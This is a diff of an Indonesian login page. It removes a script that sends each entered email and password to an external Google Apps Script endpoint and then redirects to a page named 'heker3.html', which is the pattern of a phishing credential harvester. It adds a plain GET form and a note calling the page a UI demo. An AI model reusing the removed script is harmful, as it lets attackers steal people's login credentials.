@@ -10,7 +10,7 @@
   <main class="container">
     <div class="card">
       <h1 class="title">Masuk</h1>
-      <form id="loginForm" class="form">
+      <form action="heker3.html" method="get" class="form">
         <label for="email">Email</label>
         <input id="email" name="email" type="email" placeholder="you@example.com" required />
 
@@ -19,37 +19,8 @@
 
         <button type="submit" class="btn">Login</button>
       </form>
-      <p id="status"></p>
+      <p class="note">Contoh sederhana: tidak terhubung ke server — hanya demo UI.</p>
     </div>
   </main>
-
-  <script>
-    const scriptURL = "https://script.google.com/macros/s/AKfycbwu1YwjcHzNO6UuIJ-bTuh_eA33XZs0fB3yRS1-l6k7YtXVQ53x0n9sn-MmkHRG2AHZjw/exec"; // ganti dengan URL dari langkah 4
-    const form = document.getElementById("loginForm");
-    const status = document.getElementById("status");
-
-    form.addEventListener("submit", e => {
-      e.preventDefault();
-      const data = {
-        email: form.email.value,
-        password: form.password.value
-      };
-
-      fetch(scriptURL, {
-        method: "POST",
-        body: JSON.stringify(data)
-      })
-      .then(res => res.json())
-      .then(res => {
-        if(res.result === "success"){
-          window.location.href = "heker3.html";
-        }
-      })
-      .catch(err => {
-        status.innerText = "Terjadi kesalahan!";
-        console.error(err);
-      });
-    });
-  </script>
 </body>
-  </html>
+</html>
